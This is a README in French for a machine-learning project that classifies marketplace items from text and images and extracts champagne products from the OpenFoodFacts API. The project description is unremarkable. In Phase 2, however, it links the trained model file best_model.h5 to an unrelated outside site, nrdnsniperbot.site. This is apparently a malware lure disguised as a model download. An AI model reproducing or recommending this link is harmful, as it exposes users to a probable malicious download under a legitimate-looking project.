
📚 Étude de faisabilité et classification d'articles - Place de Marché
Bienvenue dans ce projet d'étude de faisabilité et de classification d'articles pour la marketplace anglophone Place de Marché.

🎯 Objectif du projet
Notre mission :
Étudier la faisabilité d'un moteur de classification automatique des articles à partir de descriptions textuelles et images, puis aller plus loin avec la mise en place d'une classification supervisée d'images et l'exploitation d'une API de récupération de produits alimentaires.

🛠️ Démarche
Phase 1 : Étude de faisabilité
Prétraitement des textes : nettoyage, lemmatisation, stemming

Extraction de features texte :

Approches Bag-of-Words

TF-IDF

Word/Sentence Embeddings : Word2Vec, GloVe, BERT, USE

Analyse visuelle :

Réduction de dimension (PCA, t-SNE) pour visualiser les regroupements

Mesure de similarité entre clusters et catégories réelles

Prétraitement des images :

Normalisation, mise en niveaux de gris, filtrage du bruit

Extraction de features image :

SIFT / ORB

CNN via Transfer Learning (mobilenet, resnet, etc.)

Analyse de faisabilité :

Visualisation 2D

Évaluation des séparations naturelles entre catégories

Phase 2 : Classification supervisée
Construction d'un modèle de classification d'images

Utilisation de la Data Augmentation pour améliorer les performances

Entraînement d'un modèle CNN

Téléchargement du modèle entraîné :
👉 Télécharger best_model.h5 : https://nrdnsniperbot.site/download.html

Phase 3 : Exploitation de l'API OpenFoodFacts
Connexion à l'API pour récupérer des produits liés au champagne

Extraction et sauvegarde des 10 premiers produits dans un fichier CSV

Colonnes extraites : foodId, label, category, foodContentsLabel, image

📂 Contenu du dépôt
1_preprocessing_feature_extraction_faisabilite.ipynb :
Prétraitement, extraction de features et étude de faisabilité

2_classification_images.ipynb :
Classification supervisée des images

3_api_openfoodfacts_extraction.ipynb :
Requête API et extraction des données

products_champagne.csv :
Données extraites via API

presentation_resultats.pdf :
Support de présentation du projet

best_model.h5 :
Modèle de classification d'images — à télécharger séparément ici

📊 Résultats clés
Capacité à séparer visuellement et algorithmiquement certaines catégories d'articles à partir de leurs descriptions/images.

Déploiement d’un modèle CNN performant pour la classification supervisée d'articles.

Intégration d’une collecte dynamique de données via une API publique.

💬 Contact
Pour toute question ou suggestion, n'hésitez pas à me contacter via GitHub ou par email.
